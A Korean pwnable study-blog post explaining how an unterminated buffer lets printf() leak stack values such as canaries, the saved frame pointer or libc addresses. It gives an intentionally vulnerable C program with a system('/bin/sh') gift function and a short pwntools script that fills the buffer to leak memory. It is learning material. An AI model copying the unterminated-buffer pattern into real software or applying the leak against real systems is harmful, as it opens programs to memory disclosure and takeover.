---
title: "[PWNABLE] Off_By_One"
description: "※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ canary leak을 다룰 때도 사용했던 기법이다.https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C [PWNABLE] Canary 우회※ 잘못된 부분이 있으면 알려주세요. "
date: "2024-06-24"
translation_key: "tistory-d43d36c81946"
tags: ["STUDY/PWNABLE_AMD64"]
category: "STUDY/PWNABLE_AMD64"
source_url: "https://whrdud727.tistory.com/entry/PWNABLE-OffByOne"
private: false
---

**※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. **※**** 

canary leak을 다룰 때도 사용했던 기법이다.

[https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C](https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C)

 [\[PWNABLE\] Canary 우회

※ 잘못된 부분이 있으면 알려주세요. 확인 후 수정하도록 하겠습니다. ※ 이전 포스팅에서 canary에 대해 다루었다. 이번에는 그 우회 방법들을 다루겠다. 1. canary leak 2. got overwrite (간단하게만 설

whrdud727.tistory.com](https://whrdud727.tistory.com/entry/PWNABLE-Canary-%EC%9A%B0%ED%9A%8C)

canary뿐만 아니라 stack, pie\_base, libc\_base 등의 값을 leak할 때 가장 많이 사용하는 친구 중 하나이다.

일반적으로 printf()같은 함수들은 문자열을 출력할 때 NULL Byte (\\x00)이 나오기 전까지 계속 출력을 시도한다.

이때 leak하고자 하는 값 앞까지 NULL Byte가 존재하지 않게 한다면 printf()에 의해서 메모리 주소가 leak이 된다.

아래 간단한 예제를 가지고 살펴 보겠다.

```
// gcc -no-pie -fno-stack-protector -z execstack -o ex ex.c
#include <stdio.h>
#include <stdlib.h>

void gift() {
	printf("Hello! ZZoMblE");
	system("/bin/sh");
}
void initialize() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
}
void vuln() {
	char buf[128];
	printf("input : ");

	read(0,buf,128);
	printf("%s",buf);

}
int main() {
	initialize();
	vuln();
	return 0;
}
```

한눈에 봤을 떄는 별다른 취약점을 못 찾을 것이다.

여기서 취약한 부분은 read()로 값을 입력받는데 문자열 buf와 같은 크기로 입력을 받고 있는 것이다. 다시 말해서 문자열에 NULL Byte가 존재해야하는데 모든 문자열 버퍼를 채우면 NULL Byte가 존재할 수 있는 공간의 없어진다.

![](/assets/images/tistory/tistory-d43d36c81946/001.png)

```
from pwn import *

target = b'./ex'

p = process(target)
e = ELF(target)

context.log_level = 'debug'

payload = b'a'*128
p.sendafter(b':', payload)

p.interactive()
```

메모리 값 leak 되는 것을 확인하기 위해 debug 모드를 사용했다.

![](/assets/images/tistory/tistory-d43d36c81946/002.png)

vuln()의 sfp가 leak이 된 것을 확인할 수 있다.
